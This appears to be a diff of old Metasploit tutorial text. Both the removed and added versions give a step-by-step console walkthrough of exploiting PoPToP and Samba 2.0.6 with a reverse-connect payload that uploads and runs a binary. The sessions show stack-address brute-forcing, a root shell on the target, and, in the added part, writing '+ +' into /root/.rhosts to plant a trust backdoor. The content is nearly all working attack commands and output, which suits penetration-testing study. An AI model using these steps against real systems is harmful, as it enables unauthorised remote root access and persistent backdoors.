@@ -1,153 +1,50 @@
-1) First, kick open msfconsole
+1) Determine your metasploit interface and options
 
-+ -- --=[ msfconsole v2.1 [22 exploits - 27 payloads]
++ -- --=[ msfconsole v2.3 [46 exploits - 68 payloads]
 
-msf >
+msf > setg RHOST 192.168.0.252
+RHOST -> 192.168.0.252
+msf > setg LHOST 192.168.0.20
+LHOST -> 192.168.0.20
+msf > use samba_nttrans
+msf samba_nttrans > set TARGET 3
+TARGET -> 3
 
-2) Set environmental variables in the global environment (settings that you want
-   to keep between exploits)
 
-msf > setg RHOST 192.168.0.230
-RHOST -> 192.168.0.230
-msf > setg LHOST 192.168.0.106
-LHOST -> 192.168.0.106
+2) Set PAYLOAD to linux_ia32_reverse_impurity
 
-3) Load up your exploit module
+msf samba_nttrans > set PAYLOAD linux_ia32_reverse_impurity
+PAYLOAD -> linux_ia32_reverse_impurity
 
-msf > use poptop_negative_read 
 
-4) Show available payloads
+3) Set PEXEC to the path of your impurity module
 
-msf poptop_negative_read > show payloads 
+msf samba_nttrans(linux_ia32_reverse_impurity) > set PEXEC data/shelldemo
+PEXEC -> data/shelldemo
 
-Metasploit Framework Usable Payloads
-====================================
 
-  linx86bind           Listen for connection and spawn a shell                  
-  linx86bind_ie        Listen for connection and spawn a shell                  
-  linx86findsock       Spawn a shell on the established connection              
-  linx86reverse        Connect back to attacker and spawn a shell               
-  linx86reverse_ie     Connect back to attacker and spawn a shell               
-  linx86reverse_imp    Connect back to attacker and download impurity module    
+4) Launch the exploit
 
-5) Pick our payload (impurity reverse connect)
+msf samba_nttrans(linux_ia32_reverse_impurity) > exploit
+[*] Starting Reverse Handler.
+[*] Starting attack against target Samba 2.0.6 / Red Hat 6.2
+[*] Attack will use 1 threads with 1 total attempts
 
-msf poptop_negative_read > set PAYLOAD linx86reverse_imp
-PAYLOAD -> linx86reverse_imp
-
-6) Show the exploit and payload options (You can see defaults already filled in)
-
-msf poptop_negative_read > show options 
-
-Exploit and Payload Options
-===========================
-
-  Exploit:    Name      Default          Description           
-  --------    ------    -------------    ------------------    
-  required    RHOST     192.168.0.230    The target address    
-  required    RPORT     1723             The poptop port       
-  
-  Payload:    Name      Default          Description                            
-  --------    ------    -------------    -----------------------------------    
-  required    LHOST     192.168.0.106    Local address to receive connection    
-  required    PEXEC                      The path to the payload executable     
-  required    LPORT                      Local port to receive connection       
-  
-
-7) Set the impurity executable to upload/execute
-
-msf poptop_negative_read > set PEXEC ./data/shelldemo
-PEXEC -> ./data/shelldemo
-
-8) Set the local port to connect back to (handler binds and listens, its magic)
-
-msf poptop_negative_read > set LPORT 12344
-LPORT -> 12344
-
-9) Show exploit and payload advanced options
-
-msf poptop_negative_read > show advanced 
-
-Exploit and Payload Advanced Options
-====================================
-
-  Payload (Msf::Payload::linx86_reverse_impurity):
-  ------------------------------------------------
-
-  Exploit (Msf::Exploit::poptop_negative_read):
-  ---------------------------------------------
-  Name:     ExtraSpace
-  Default:  0
-
-  While, this may at first sound like something you may never
-  want to do, it actually isn't really bad at all.  Right now
-  sitting right before our payload is 128 bytes used for the
-  Hostname and Vendor name, the reason I am leaving this
-  intact is because someday I'd like to have the packets look
-  like they came from a real client (ie windows).  If you use
-  this option (say, set it to 128), it will give you 128 more
-  bytes, starting the payload in this space.
-  
-
-  Name:     RetLength
-  Default:  32
-
-  Length of rets after payload
-  
-
-  Name:     StackTop
-  Default:  0xbffffa00
-
-  Start address for stack ret bruteforcing
-  
-
-  Name:     BruteWait
-  Default:  0.4
-
-  Length in seconds to wait between brute force attempts
-  
-
-  Name:     StackBottom
-  Default:  0xbffff000
-
-  End address for stack ret bruteforcing
-  
-
-  Name:     PreRetLength
-  Default:  220
-
-  Space before the we start writing return address.  Note:
-  this will be set to RetLenght + ExtraSpace during use.
-  
-
-  Name:     StackStep
-  Default:  0
-
-  Step size for ret bruteforcing, 0 for auto
-  
-
-* Note: This is unique to this exploit *
-10) Set ExtraSpace, giving us the ability to use bigger payloads and making the
-    brute force go faster (bigger nop sled, bigger StackStep)
-
-msf poptop_negative_read > set ExtraSpace 128
-ExtraSpace -> 128
-
-11) Lets rock it yo
-
-msf poptop_negative_read > exploit
-Trying 0xbffffa00
-Trying 0xbffff948
-Trying 0xbffff890
-Trying 0xbffff7d8
-[*] Connection from 192.168.0.230:1067...
-[*] Uploading 14896 bytes... Done
-[*] Switching to impurity payload
+[*] Establishing 1 connection(s) to the target...
+[*] --- Setting up the SMB session...
+[*] --- Establishing tree connection...
+[*] --- Sending first nttrans component...
+[*] --- Completed range 0x08138300:0x08137cc0
+[*] Got connection from 192.168.0.20:4321 <-> 192.168.0.252:1066
+[*] Sleeping before sending impurity data.
+[*] Uploading impurity data (17600), Please wait...
+[*] Executing impurity data.
 
 --=[ Impurity Demo Shell
 impurity demo >
 
-11) Impurity worked! We now uploaded and ran our executable.
+
+5) Use the Impurity shell!
 
 impurity demo > help
 Available Commands:
@@ -158,19 +55,24 @@ Available Commands:
    write <fd> <bytes>   Write <bytes> to file descriptor
    close <fd>           Close a specified file descriptor
    unlink <path>        Remove the specified file
+   getid                Print uid/gid
+   setuid <uid>         Set UID to the specified number
+   setgid <gid>         Set GID to the specified number
    help                 Show this help screen
    quit                 Exit the Impurity Demo shell
-impurity demo > lsfd
-[0] [rwxrwxrwx] dev=0 ino=19826 uid=0 gid=0 rdev=0 size=0 socket (192.168.0.230:1067 -> 192.168.0.106:12344)
-[1] [rwxrwxrwx] dev=0 ino=19826 uid=0 gid=0 rdev=0 size=0 socket (192.168.0.230:1067 -> 192.168.0.106:12344)
-[2] [rwxrwxrwx] dev=0 ino=19826 uid=0 gid=0 rdev=0 size=0 socket (192.168.0.230:1067 -> 192.168.0.106:12344)
-[3] [rwxrwxrwx] dev=0 ino=19825 uid=0 gid=0 rdev=0 size=0 socket (192.168.0.230:1067 -> 192.168.0.106:12344)
-impurity demo > exec id
-[*] executing id
-uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
-impurity demo > quit
-[*] Exiting Shell Listener...
-
-msf poptop_negative_read > quit
-
-12) How cool was that? Enjoy. -spn
+impurity demo > getid
+uid=0(root) gid=0(root) euid=99(nobody) egid=99(nobody)
+impurity demo > open /root/.rhosts
+OPEN: ERROR [/root/.rhosts]
+impurity demo > setuid 0
+SETUID: 0
+impurity demo > setgid 0
+SETGID: 0
+impurity demo > getid
+uid=0(root) gid=0(root)
+impurity demo > open /root/.rhosts
+OPEN: 10
+impurity demo > write 10 3
++ +
+WRITE: 3
+impurity demo >
